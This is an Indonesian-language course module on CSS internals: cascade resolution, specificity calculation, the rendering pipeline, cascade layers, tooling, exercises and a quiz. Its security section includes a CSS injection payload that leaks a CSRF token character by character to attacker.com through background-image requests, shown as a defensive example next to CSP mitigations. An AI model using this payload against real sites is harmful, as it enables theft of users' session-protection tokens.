# Bab 01 Module 01: Fondasi CSS, Cascade Resolution, Specificity Engine, dan Browser Rendering Pipeline

---

### 1. Learning Objectives
Setelah menyelesaikan modul ini, peserta didik diharapkan mampu:
*   **Menganalisis** siklus hidup parsing CSS di browser engine (Blink/Gecko/WebKit) dari raw byte array hingga pembentukan CSSOM (CSS Object Model).
*   **Mendekonstruksi** algoritma *Cascade Resolution* berdasarkan CSS Cascading and Inheritance Level 4 & 5, termasuk evaluasi *Origin*, *Importance*, *Specificity*, dan *Order of Appearance*.
*   **Menghitung** bobot numerik *Specificity* menggunakan skema 3-tuple `(A, B, C)` secara presisi sesuai spesifikasi W3C Selectors Level 4.
*   **Mengeliminasi** *Layout Thrashing* dan *Unnecessary Reflows* dengan memetakan mutasi CSSOM terhadap fase *Style Recalculation*, *Layout*, *Paint*, dan *Composite*.
*   **Mendiagnosis** dan memperbaiki degradasi performa rendering (*Render-Blocking CSS*) menggunakan teknik asynchronous loading dan critical CSS extraction.

---

### 2. Fundamental Concepts
1.  **CSS Engine Anatomy**: Komponen browser yang bertanggung jawab mengonversi teks deklaratif CSS menjadi instruksi rendering visual melalui tokenizer, parser, style resolver, dan layout tree builder.
2.  **CSSOM (CSS Object Model)**: Struktur data pohon di memori yang merepresentasikan node-node selektor beserta nilai kalkulasi (*computed values*) dari properti styling.
3.  **Cascade**: Algoritma deterministik yang menyelesaikan konflik ketika lebih dari satu aturan CSS menargetkan elemen DOM yang sama.
4.  **Specificity**: Skema pembobotan deterministik yang diterapkan pada selektor untuk menentukan deklarasi properti mana yang menang jika origin dan importance setara.
5.  **Inheritance**: Mekanisme propagasi nilai properti CSS dari parent node ke child node pada DOM tree untuk properti-properti yang bersifat *inherited by default* (seperti `color`, `font-family`) atau melalui eksplisit keyword `inherit`.
6.  **Critical Rendering Path (CRP)**: Rangkaian tahapan sekuensial yang dilalui browser sejak menerima payload HTML/CSS hingga piksel pertama dirender ke layar (*First Contentful Paint*).

---

### 3. Why It Matters
CSS sering kali disalahpahami sebagai sekadar sintaksis deklaratif sederhana tanpa kompleksitas runtime. Pada kenyataannya, CSS berjalan di atas execution engine yang sangat teroptimasi namun memiliki konsekuensi komputasional masif jika disalahgunakan.

Ketidaktahuan terhadap *Cascade Resolution* menyebabkan perang `!important` di repositori skala enterprise, yang berujung pada arsitektur styling yang rapuh (*fragile stylesheet*), mutasi global yang tidak terduga (*side-effects*), serta regresi visual saat refactoring. 

Lebih jauh lagi, penulisan selektor yang tidak efisien dan manipulasi CSSOM secara naif memicu fenomena *Layout Thrashing* dan *Jank* (frame drop di bawah 60/120 FPS), membebani CPU, serta secara langsung mendegradasi metrik *Core Web Vitals* (terutama Interaction to Next Paint / INP dan Cumulative Layout Shift / CLS). Menguasai fondasi internal CSS adalah prasyarat absolut untuk arsitektur frontend berkinerja tinggi.

---

### 4. What It Is
CSS (Cascading Style Sheets) adalah bahasa deklaratif berbasis aturan (*rule-based declarative language*) yang menginstruksikan user agent (browser) tentang bagaimana dokumen terstruktur (seperti HTML atau XML) harus dipresentasikan pada berbagai media visual, cetak, maupun aural.

Secara formal, unit dasar CSS adalah **Rule Set** (sering disebut *Rule*), yang terdiri dari:
*   **Selector**: Pola pencocokan (*pattern-matching*) terhadap node pada DOM.
*   **Declaration Block**: Kumpulan deklarasi yang diapit tanda kurung kurawal `{}`.
*   **Declaration**: Pasangan *property-name* dan *value-expression* yang dipisahkan oleh tanda titik dua (`:`).

```css
/* Rule Set */
.card--featured[data-active="true"] { /* Selector */
  background-color: #1a1a1a;          /* Declaration (Property: Value) */
  display: flex;                      /* Declaration (Property: Value) */
}
```

---

### 5. How It Works (Internal Mechanics)
Proses browser memproses CSS melibatkan beberapa fase internal:

```
[ Raw Bytes (Network/Disk) ]
           │
           ▼
[ Character Stream (UTF-8) ]
           │ (Tokenization)
           ▼
[ CSS Tokens (Ident, At-keyword, Dimension, etc.) ]
           │ (Grammar Parsing)
           ▼
[ CSSOM Tree Structure ] ───┐
                            ├─► [ Style Recalculation (Cascade & Match) ]
[ DOM Tree Structure ]   ───┘                    │
                                                 ▼
                                        [ Render Tree ]
                                                 │
                                                 ▼
                                        [ Layout / Reflow ]
                                                 │
                                                 ▼
                                        [ Paint / Repaint ]
                                                 │
                                                 ▼
                                        [ Layer Compositing ]
                                                 │
                                                 ▼
                                      [ GPU VRAM / Display ]
```

1.  **Tokenization & Parsing**: Browser mengubah byte stream CSS menjadi tokens (`<ident-token>`, `<hash-token>`, `<string-token>`), kemudian memvalidasinya sesuai formal grammar CSS level terkait untuk menghasilkan nodus-nodus CSSOM.
2.  **Style Recalculation (Matching)**: Browser menelusuri selektor **dari kanan ke kiri (Right-to-Left / R-to-L)**. Pada selektor `.nav-list .item a`, browser pertama-tama mencocokkan seluruh elemen `<a>` (disebut *Key Selector*), baru kemudian memverifikasi apakah ancestor-nya memiliki class `.item` dan `.nav-list`. Hal ini meminimalkan traversal subtree yang tidak perlu.
3.  **Cascade Resolution Sorting Algorithm**: Jika terjadi konflik deklarasi nilai, browser mengevaluasi prioritas berdasarkan 8 level berikut (diurutkan dari prioritas terendah ke tertinggi):
    1.  User Agent normal defaults (stylesheet bawaan browser).
    2.  User normal declarations (preferensi browser pengguna).
    3.  Author normal declarations (CSS developer aplikasi).
    4.  CSS Animation declarations (animasi aktif).
    5.  Author `!important` declarations.
    6.  User `!important` declarations.
    7.  User Agent `!important` declarations.
    8.  CSS Transition declarations (transisi aktif memiliki prioritas tertinggi untuk menjamin kelancaran interpolasi visual).
4.  **Specificity Calculation**: Di dalam level Cascade yang sama (misalnya, sesama *Author normal*), konflik diselesaikan melalui kalkulasi Specificity berbasis 3-tuple `(A, B, C)`:
    *   **A**: Jumlah *ID selectors* (`#example`).
    *   **B**: Jumlah *Class selectors* (`.example`), *Attribute selectors* (`[type="radio"]`), dan *Pseudo-classes* (`:hover`, `:first-child`). **Pengecualian**: `:not()`, `:is()`, dan `:has()` tidak menambah bobot sendiri; bobot diambil dari argumen terberat di dalamnya. Pseudo-class `:where()` secara spesifik selalu bernilai `(0, 0, 0)`.
    *   **C**: Jumlah *Type selectors* (`div`, `h1`) dan *Pseudo-elements* (`::before`, `::after`).
    *   *Inline styles* (misal `<div style="...">`) tidak memiliki bobot spesifisitas standar; mereka menimpa seluruh selektor `(A, B, C)` dan hanya bisa dikalahkan oleh deklarasi `!important`.
5.  **Value Processing**: Setiap properti melalui tahapan transformasi nilai:
    $$\text{Declared Value} \longrightarrow \text{Cascaded Value} \longrightarrow \text{Specified Value} \longrightarrow \text{Computed Value} \longrightarrow \text{Used Value} \longrightarrow \text{Actual Value}$$
6.  **Layout/Reflow**: Menghitung geometri dokumen (posisi x/y, lebar, tinggi, margin box) pada Render Tree.
7.  **Paint**: Mengonversi box model hasil layout menjadi instruksi drawing piksel (skia commands, draw calls).
8.  **Compositing**: Mengunggah layer-layer bitmap yang terpisah ke GPU VRAM untuk digabungkan menjadi final frame buffer.

---

### 6. Architecture/Flow Diagram
Berikut adalah visualisasi resolusi Specificity dan Cascade Engine:

```
                  Resolusi Konflik Properti CSS
                               │
            ┌──────────────────┴──────────────────┐
            ▼                                     ▼
   Apakah Origin &                          Pemenang ditentukan oleh
   Importance berbeda?                      Tingkat Cascade Origin
            │ (Tidak)                               (Selesai)
            ▼
   Apakah Specificity                       Pemenang ditentukan oleh
   (A, B, C) berbeda?  ──────────(Ya)────►  Tuple Tertinggi
            │ (Tidak)                       (Contoh: 0,1,0 > 0,0,12)
            ▼
   Order of Appearance
   (Aturan terakhir di-parse menang)
```

Skema Specificity Tuple `(A, B, C)`:
```
+-------------------------------------------------------------------+
|  Inline Style: Mengabaikan Tuple (Kecuali terhadap !important)    |
+---------------------------------+---------------------------------+
| A: ID Selectors                 | #main-nav                       |
+---------------------------------+---------------------------------+
| B: Classes, Attributes, Pseudos | .btn, [type="submit"], :hover   |
+---------------------------------+---------------------------------+
| C: Element Types, Pseudo-elems  | div, span, p, ::before, ::after |
+---------------------------------+---------------------------------+

Contoh Kalkulasi:
#header .menu ul li a:hover
│       │    │  │  │ │
│       │    │  │  │ └─ [B: Pseudo-class] (+0,1,0)
│       │    │  │  └─── [C: Type]         (+0,0,1)
│       │    │  └────── [C: Type]         (+0,0,1)
│       │    └───────── [C: Type]         (+0,0,1)
│       └────────────── [B: Class]        (+0,1,0)
└────────────────────── [A: ID]           (+1,0,0)
Total Specificity: (1, 2, 3)
```

---

### 7. Core Syntax & Language Rules

#### Anatomi Token dan Formal Grammar
```css
/* At-Rule Definition */
@charset "UTF-8";

/* Custom Property Definition (Variables) */
:root {
  --primary-color: #0d6efd;
  --base-spacing: 1rem;
}

/* Complex Selector List dengan Functional Pseudo-classes */
article.post:not([data-archived="true"]) > header h2:first-of-type {
  color: var(--primary-color);
  font-size: calc(var(--base-spacing) * 2);
  line-height: 1.25;
}

/* Pseudo-element with Structural Matching */
.content-body::selection {
  background-color: #222;
  color: #fff;
}
```

#### Aturan Evaluasi Nilai Khusus (*Global Keywords*)
*   `inherit`: Memaksa properti mengambil *computed value* dari direct parent-nya.
*   `initial`: Menyetel properti kembali ke nilai default spesifikasi W3C (contoh: `display: inline` untuk semua elemen, termasuk `<div>`).
*   `unset`: Bertindak sebagai `inherit` jika properti bersifat natural inherited, atau `initial` jika properti non-inherited.
*   `revert`: Mengembalikan nilai properti ke cascade level sebelumnya (biasanya User Agent stylesheet).

---

### 8. Minimal Working Example (Simple Example)

Contoh berikut menunjukkan bagaimana browser mengevaluasi *Cascade*, *Specificity*, dan *Inheritance*.

```html
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi Specificity dan Cascade</title>
  <style>
    /* Specificity: (0, 0, 1) */
    p {
      color: black;
      font-size: 16px;
    }

    /* Specificity: (0, 1, 0) */
    .text-muted {
      color: gray;
    }

    /* Specificity: (0, 1, 1) */
    p.text-muted {
      color: blue; /* MENANG ATAS .text-muted KARENA SPECIFICITY LEBIH TINGGI */
    }

    /* Specificity: (0, 1, 1) - Urutan Kemunculan */
    p.text-override {
      color: green; /* MENANG ATAS p.text-muted JIKA URUTANNYA DI BAWAH */
    }

    /* Demonstrasi Inheritance */
    .parent-container {
      font-family: monospace; /* Diwariskan (Inherited) ke anak */
      border: 2px solid red;   /* TIDAK diwariskan (Non-inherited) */
    }
  </style>
</head>
<body>
  <div class="parent-container">
    <!-- Teks akan berwarna hijau dan font monospace, tetapi TIDAK memiliki border merah -->
    <p class="text-muted text-override">
      Mekanisme Cascading dan Inheritance Browser Engine.
    </p>
  </div>
</body>
</html>
```

---

### 9. Real-World Implementation (Practical/Production Example)

Berikut adalah modul tokenisasi tema enterprise yang menggunakan arsitektur Cascade Layers (`@layer`) sesuai CSS Cascading and Inheritance Level 5. Pendekatan ini secara definitif menyelesaikan masalah spesifisitas pada aplikasi skala besar tanpa memerlukan trik hacking specificity.

```css
/**
 * Architecture: Enterprise Multi-Layer Design System
 * File: theme-engine.css
 */

/* 1. Deklarasi Urutan Layer Secara Eksplisit (Prioritas: utilities > components > base > reset) */
@layer reset, base, components, utilities;

/* 2. Layer: Reset & Normalization */
@layer reset {
  *, *::before, *::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    -webkit-font-smoothing: antialiased;
    text-rendering: optimizeLegibility;
  }
}

/* 3. Layer: Base Typography & Defaults */
@layer base {
  :root {
    --color-surface-base: #ffffff;
    --color-text-main: #111827;
    --color-primary-600: #2563eb;
    --color-primary-700: #1d4ed8;
    --space-4: 1rem;
    --radius-md: 0.375rem;
  }

  body {
    background-color: var(--color-surface-base);
    color: var(--color-text-main);
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }
}

/* 4. Layer: Component Logic */
@layer components {
  /* Meskipun selector ini memiliki Specificity sangat tinggi (1, 1, 1),
     ia akan tetap kalah oleh @layer utilities dengan Specificity (0, 1, 0) */
  #main-content .btn-primary {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    padding: 0.5rem var(--space-4);
    background-color: var(--color-primary-600);
    color: #ffffff;
    border: 1px solid transparent;
    border-radius: var(--radius-md);
    cursor: pointer;
    font-weight: 500;
  }

  #main-content .btn-primary:hover {
    background-color: var(--color-primary-700);
  }
}

/* 5. Layer: Atomic Utilities */
@layer utilities {
  /* Utility class menang atas component layer secara deterministik */
  .u-hidden {
    display: none;
  }

  .u-bg-transparent {
    background-color: transparent;
  }
}
```

Penggunaan di HTML:
```html
<main id="main-content">
  <!-- Elemen ini di-hide secara deterministik tanpa butuh !important -->
  <button class="btn-primary u-hidden">Tombol Aksi</button>
</main>
```

---

### 10. Anti-Patterns & Common Pitfalls

#### Anti-Pattern 1: Eskalasi `!important` (*The Nuclear Option*)
```css
/* ANTI-PATTERN */
.card-title {
  color: #333 !important;
}
/* Memaksa selector lain menggunakan !important yang lebih tinggi spesifisitasnya */
.widget .card-title {
  color: #000 !important; /* Rapuh, merusak Cascade resolution */
}

/* REFAKTORISASI: Turunkan Spesifisitas atau Gunakan Layer */
@layer components {
  .card-title {
    color: #333;
  }
  .widget .card-title {
    color: #000;
  }
}
```

#### Anti-Pattern 2: Over-qualified Selectors
```css
/* ANTI-PATTERN: Menambah beban parser kanan-ke-kiri browser */
div#container ul.menu-list li.menu-item a.link {
  font-weight: bold;
}

/* REFAKTORISASI: Gunakan flat/atomic BEM class */
.menu-link {
  font-weight: bold;
}
```

#### Anti-Pattern 3: Mutasi Properti yang Memicu Layout Thrashing
```javascript
// ANTI-PATTERN: Read/Write Layout Pipeline Interleaving
const elements = document.querySelectorAll('.box');
elements.forEach(el => {
  // Read (Force Style Recalculation & Layout)
  const height = el.getBoundingClientRect().height;
  // Write (Invalidates Layout)
  el.style.height = `${height + 10}px`;
});

// REFAKTORISASI: Batch reads, lalu batch writes (atau gunakan requestAnimationFrame)
const heights = Array.from(elements, el => el.getBoundingClientRect().height);
elements.forEach((el, i) => {
  el.style.height = `${heights[i] + 10}px`;
});
```

---

### 11. Performance Considerations & Profiling

#### Dampak Kompleksitas Selektor terhadap Style Invalidation
Saat DOM node dimutasi, browser tidak melakukan re-styling pada satu node saja secara terisolasi. Browser harus mengevaluasi subsistem *Selector Matching*.
*   Selektor kompleks seperti `div:nth-child(2n+1) > [data-active="true"] ~ span` membutuhkan traversal DOM tree multi-arah (ancestor, sibling, descendants), menyebabkan cycle time **Style Invalidation Engine** melonjak.
*   Gunakan Chrome DevTools Performance Profiler: Rekam trace, amati blok **Recalculate Style**. Jika metrik *Recalculate Style* memakan waktu `> 5ms`, identifikasi metrik **Elements Affected** dan simplifikasi selektor CSS.

#### Trigger Pipeline Rendering Matrix
| Properti CSS Dimodifikasi | Memicu Layout (Reflow)? | Memicu Paint? | Memicu Composite? |
| :--- | :--- | :--- | :--- |
| `width`, `height`, `margin`, `padding` | **Ya** | **Ya** | **Ya** |
| `background-color`, `color`, `visibility` | **Tidak** | **Ya** | **Ya** |
| `transform`, `opacity`, `filter` | **Tidak** | **Tidak** | **Ya (GPU Acceleration)** |

*Optimasi*: Gunakan `transform: translate3d()` atau `will-change` (secara bijak) untuk memindahkan komputasi langsung ke GPU Compositor thread tanpa menyentuh CPU main thread.

---

### 12. Edge Cases, Quirks, & Compiler/Browser Bugs

#### 1. Faux Specificity pada `:is()` vs `:where()`
Pseudo-class `:is()` mengambil spesifisitas tertinggi dari daftar argumen di dalamnya. Sebaliknya, `:where()` selalu bernilai `(0, 0, 0)`.
```css
/* Specificity: (1, 0, 0) karena #critical-id ada di dalam :is() */
:is(section, article, #critical-id) p {
  color: red;
}

/* Specificity: (0, 0, 1) karena :where() mengabaikan isi argumen */
:where(section, article, #critical-id) p {
  color: blue;
}
```

#### 2. Margin Collapsing Anomalies
Margin vertikal (top dan bottom) antara dua block-level elements yang bertetangga dapat bergabung (*collapse*) menjadi satu margin tunggal:
*   Besaran margin baru adalah nilai terbesar dari kedua margin (jika keduanya positif).
*   Jika salah satu negatif, rumusnya: $\text{Margin Positif Terbesar} - |\text{Margin Negatif Terkecil}|$.
*   *Edge case*: Margin **tidak** mengalami collapse jika elemen berada dalam konteks *Flexbox*, *Grid*, atau memiliki properti `overflow` selain `visible` (*Block Formatting Context / BFC*).

---

### 13. Trade-offs & Alternatives

| Pendekatan Arsitektur | Kelebihan | Kekurangan | Kapan Digunakan |
| :--- | :--- | :--- | :--- |
| **Vanilla CSS + Cascade Layers (`@layer`)** | Native browser support, tanpa build step, resolusi kontrol spesifisitas absolut, performa runtime optimal. | Membutuhkan kedisiplinan hierarki tim, browser legacy butuh polyfill. | Aplikasi modern, design systems berskala besar, micro-frontends. |
| **CSS Modules** | Scoped styling otomatis melalui hashing nama class, mengeliminasi class collision secara total. | Menambah footprint size tooling (Webpack/Vite), tidak menyelesaikan cascade internal secara dinamis. | Aplikasi SPA (React/Vue/Angular) berskala enterprise. |
| **Utility-First (Tailwind Engine)** | Dead code elimination via Purge/JIT, zero specificity conflict (semua single-class), prototyping super cepat. | HTML verbose, abstraksi CSS hilang, sulit maintain jika arbitrary value tidak dikontrol. | Rapid MVP, aplikasi dengan design token yang terstandardisasi ketat. |
| **CSS-in-JS (Runtime: Emotion/Styled)** | Dynamic theme injection via JavaScript execution context. | Runtime overhead masif (CPU-bound style injection), memicu re-render cascade dan blocking CRP. | Legacy applications, highly dynamic visual dashboards (hindari untuk static/content sites). |

---

### 14. Security & Hardening Implications

#### 1. CSS Injection Attacks (Data Exfiltration)
Jika aplikasi menerima input CSS mentah dari pengguna, penyerang dapat mengekstrak data sensitif (seperti token CSRF dari input tersembunyi) menggunakan selektor atribut parsial berantai yang dipadukan dengan background request eksternal:

```css
/* Malicious CSS Payload Injection */
input[name="csrf_token"][value^="a"] {
  background-image: url("https://attacker.com/leak?char=a");
}
input[name="csrf_token"][value^="b"] {
  background-image: url("https://attacker.com/leak?char=b");
}
```
*Mitigasi*:
*   Terapkan **Content Security Policy (CSP)** yang ketat tanpa `'unsafe-inline'`:
    ```http
    Content-Security-Policy: default-src 'self'; style-src 'self' https://trusted-cdn.com;
    ```
*   Jangan pernah merender user-controlled strings secara langsung ke dalam tag `<style>` tanpa sanitasi parser CSS tingkat tinggi.

#### 2. Clickjacking via Opacity Masking
Penyerang menempatkan iframe transparan (`opacity: 0`) persis di atas tombol yang sah menggunakan `z-index` tinggi.
*Mitigasi*:
*   Kirim header `X-Frame-Options: DENY` atau CSP `frame-ancestors 'none'`.

---

### 15. Testing & Debugging Strategies

#### Algoritma Debugging Style Recalculation di DevTools
1.  Buka **Chrome DevTools** -> Tab **Elements**.
2.  Buka tab **Computed** di panel kanan.
3.  Centang **Show all** untuk melihat nilai akhir yang dihitung (*Used/Computed Value*).
4.  Klik tanda panah ekspansi pada properti yang bermasalah. Browser akan menampilkan secara akurat:
    *   Setiap deklarasi yang menargetkan properti tersebut.
    *   File stylesheet dan nomor barisnya.
    *   Alasan mengapa deklarasi lain dicoret (kalah specificity, tertimpa layer, atau sintaksis invalid).

#### Visual Debugging Menggunakan At-Rule Diagnostik
```css
/* QA Diagnostic Block: Tempatkan di development build */
/* Deteksi elemen gambar tanpa alt attribute */
img:not([alt]) {
  outline: 5px solid red !important;
}

/* Deteksi link dengan href kosong atau placeholder */
a[href=""], a[href="#"] {
  outline: 3px dashed orange !important;
}
```

---

### 16. Best Practices & Production Checklist

- [ ] **Zero Unscoped Global Tags**: Hindari styling bare tag (misal `div { ... }`) di luar layer `reset` atau `base`.
- [ ] **Specificty Cap Rule**: Jaga bobot selektor maksimal pada tuple `(0, 2, 0)`. Selektor ID (`#id`) dilarang untuk styling.
- [ ] **No `!important` Policy**: Gunakan `@layer` untuk mengontrol dependensi prioritas aturan daripada menaikkan flag importance.
- [ ] **Critical CSS Inlined**: Ekstrak CSS yang dibutuhkan untuk rendering above-the-fold dan tempatkan di inline `<style>` pada `<head>`.
- [ ] **Preload Asynchronous Stylesheets**: Non-critical CSS harus dimuat dengan mekanisme non-render-blocking:
  ```html
  <link rel="preload" href="non-critical.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="non-critical.css"></noscript>
  ```
- [ ] **Containment Optimization**: Terapkan properti `contain: layout paint;` atau `content-visibility: auto;` pada elemen card/list panjang untuk mengisolasi sub-tree style recalculation.

---

### 17. Tooling & Ecosystem Integration

Dalam pipeline produksi enterprise, raw CSS diproses melalui serangkaian build tooling:

1.  **PostCSS**: Tool modular untuk memanipulasi CSS via plugins AST (Abstract Syntax Tree).
    *   `autoprefixer`: Membaca database *Can I Use* dan menambahkan vendor prefixes (`-webkit-`, `-moz-`) secara presisi.
    *   `postcss-preset-env`: Mengizinkan penggunaan fitur CSS standar masa depan (*future CSS*) dengan mengonversinya ke sintaksis yang dipahami browser saat ini.
2.  **Stylelint**: Linter CSS statis untuk memvalidasi kepatuhan terhadap standar arsitektur:
    ```json
    /* .stylelintrc.json */
    {
      "rules": {
        "selector-max-id": 0,
        "declaration-no-important": true,
        "max-nesting-depth": 3,
        "selector-class-pattern": "^[a-z]([a-z0-9-]+)?(__[a-z0-9-]+)?(--[a-z0-9-]+)?$"
      }
    }
    ```
3.  **Lightning CSS / CSSNano**: Minifier berbasis Rust yang melakukan *structural optimization*, *dead-code pruning*, dan penggabungan deklarasi identik.

---

### 18. Enterprise Scale & Architecture Patterns

Pada repository dengan ratusan engineer, arsitektur CSS harus dirancang tahan terhadap regresi (*fault-tolerant*). 

#### BEM (Block, Element, Modifier) + ITCSS Hierarchy
Struktur direktori logis menggunakan **Inverted Triangle CSS (ITCSS)** untuk memastikan spesifisitas mengalir dari rendah ke tinggi:

```
styles/
├── 01-settings/     /* Variabel global, config token */
├── 02-tools/        /* Mixins, functions */
├── 03-generic/      /* CSS Reset, normalize, box-sizing */
├── 04-elements/     /* Unclassed HTML elements (h1, a, p) */
├── 05-objects/      /* Layout primitives (grid, flex-container) */
├── 06-components/   /* UI modules spesifik (BEM: .c-card, .c-btn) */
└── 07-utilities/    /* Override helpers dengan namespace (.u-clearfix) */
```

#### Integrasi Design Tokens
Sinkronisasi variabel terpusat dari format JSON (Design Source of Truth) ke CSS Custom Properties via build pipeline:

```css
/* Generated via Token Engine */
:root {
  --ds-spacing-sm: 8px;
  --ds-spacing-md: 16px;
  --ds-elevation-low: 0 1px 3px rgba(0,0,0,0.12);
}

.c-surface {
  padding: var(--ds-spacing-md);
  box-shadow: var(--ds-elevation-low);
}
```

---

### 19. Exercises & Hands-on Challenges

#### Tantangan 1: Hitung Specificity Tuple
Tentukan bobot specificity numerik `(A, B, C)` untuk selector-selector berikut, kemudian urutkan dari prioritas terendah ke tertinggi:
1.  `div#app.container ul.nav li:first-child a[target="_blank"]`
2.  `:is(header, footer) > nav.menu:not(.hidden) a:hover`
3.  `:where(article.post) h1::before`
4.  `button.btn[type="button"]:disabled`

#### Tantangan 2: Arsitektur Cascade Layers
Diberikan situasi berikut: Tim UI Library mendistribusikan class `.badge` dengan styling:
```css
.badge {
  background-color: blue;
  color: white;
  padding: 4px;
}
```
Tim aplikasi ingin menimpa warna background `.badge` ini dengan class utility `.bg-green` yang dibuat di aplikasi, namun *tanpa mengubah kode CSS UI Library*, *tanpa menaikkan bobot selector*, dan *tanpa `!important`*. 
*Tugas*: Rancang struktur file CSS memanfaatkan `@layer` untuk membuktikan bahwa `.bg-green` dapat menimpa properti `.badge` secara stabil terlepas dari urutan loading file.

---

### 20. Quiz & Self-Assessment

1.  **Jika terjadi konflik deklarasi antara User Agent `!important` dan Author `!important`, manakah yang menang menurut CSS Cascading Engine?**
    *   A. Author `!important`
    *   B. User Agent `!important`
    *   C. Keduanya dibatalkan, fallback ke specified value
    *   D. Tergantung urutan include file di HTML
    *   *Jawaban yang benar*: B. Pada cascade origin importance, User Agent `!important` memiliki level lebih tinggi daripada Author `!important` untuk menjamin accessibility browser (misal: forced high-contrast mode).

2.  **Berapakah bobot Specificity tuple `(A, B, C)` dari selektor `:where(.card) .title:hover`?**
    *   A. `(0, 3, 0)`
    *   B. `(0, 2, 0)`
    *   C. `(0, 1, 0)`
    *   D. `(1, 1, 0)`
    *   *Jawaban yang benar*: B. `:where(.card)` selalu bernilai `(0, 0, 0)`. Selector yang tersisa adalah `.title` (Class = +0,1,0) dan `:hover` (Pseudo-class = +0,1,0). Total: `(0, 2, 0)`.

3.  **Mengapa browser engine membaca CSS Selector dari kanan ke kiri (Right-to-Left)?**
    *   A. Karena struktur grammar CSS diturunkan dari bahasa Arab/Ibrani.
    *   B. Untuk memvalidasi rule syntax sebelum alokasi memori.
    *   C. Mengeliminasi elemen DOM yang tidak relevan secepat mungkin melalui evaluasi *Key Selector*.
    *   D. Menjaga kompatibilitas dengan AST (Abstract Syntax Tree) ECMAScript.
    *   *Jawaban yang benar*: C. Dengan mengevaluasi Key Selector terlebih dahulu, browser dapat langsung membuang ribuan node yang tidak cocok tanpa perlu membuang resource memeriksa ancestor tree mereka.

4.  **Manakah mutasi properti CSS berikut yang TIDAK memicu fase Layout (Reflow) dan Paint pada rendering pipeline, melainkan langsung ke Composite phase?**
    *   A. `top`
    *   B. `opacity`
    *   C. `margin-left`
    *   D. `color`
    *   *Jawaban yang benar*: B. `opacity` (bersama dengan `transform`) ditangani langsung oleh GPU Compositor layer tanpa perlu menghitung ulang layout geometri dokumen ataupun rasterisasi ulang canvas.

5.  **Diberikan selector `.item:not(:hover, .active)`. Berapakah bobot Specificity tuple `(A, B, C)` miliknya?**
    *   A. `(0, 3, 0)`
    *   B. `(0, 2, 0)`
    *   C. `(0, 1, 0)`
    *   D. `(0, 1, 1)`
    *   *Jawaban yang benar*: B. `.item` bernilai `(0, 1, 0)`. Pseudo-class `:not()` mengambil bobot argumen terberat di dalamnya. Di dalam tanda kurung ada `:hover` `(0, 1, 0)` dan `.active` `(0, 1, 0)`. Nilai maksimalnya adalah `(0, 1, 0)`. Total: `(0, 1, 0) + (0, 1, 0) = (0, 2, 0)`.